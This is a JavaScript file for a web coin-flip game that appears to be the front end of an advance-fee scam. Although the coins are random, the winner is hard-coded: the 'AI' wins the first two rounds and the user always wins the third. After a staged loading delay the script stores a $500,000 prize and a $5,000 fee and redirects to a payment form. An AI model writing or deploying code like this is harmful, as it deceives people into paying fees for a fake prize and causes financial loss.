const flipButton = document.getElementById("flip-button");
const result = document.getElementById("result");
const loading = document.getElementById("loading");
const player1Coin = document.getElementById("player1-coin");
const player2Coin = document.getElementById("player2-coin");

let gameCount = 0;

flipButton.addEventListener("click", () => {
    gameCount++;
    if (gameCount <= 3) {
        playGame(gameCount);
    } else {
        result.innerText = "Game Over! Please refresh to play again.";
    }
});

function playGame(round) {
    result.innerText = `Round ${round}: Flipping the coin...`;
    player1Coin.textContent = "Flipping...";
    player2Coin.textContent = "Flipping...";
    flipButton.disabled = true;

    setTimeout(() => {
        const player1Choice = Math.random() > 0.5 ? "Heads" : "Tails";
        const player2Choice = player1Choice === "Heads" ? "Tails" : "Heads";

        player1Coin.textContent = player1Choice;
        player2Coin.textContent = player2Choice;

        let winner;
        if (round === 1 || round === 2) {
            winner = "AI"; // AI wins first 2 rounds
        } else {
            winner = "User"; // User wins the 3rd round
        }

        result.innerHTML = winner === "AI" 
            ? `Round ${round} Winner: <b>Player 2 (AI)</b>`
            : `Round ${round} Winner: <b>Player 1 (User)</b>`;

        if (round === 3) {
            setTimeout(() => {
                loading.style.display = "block";
                setTimeout(() => {
                    // Redirect to payment form
                    const prize = "$500,000.00";
                    const fee = "$5,000";

                    localStorage.setItem("winnerName", "Player 1");
                    localStorage.setItem("winnerAmount", prize);
                    localStorage.setItem("winnerFee", fee);

                    window.location.href = "form.html";
                }, 10000);
            }, 2000);
        }

        flipButton.disabled = false;
    }, 2000);
}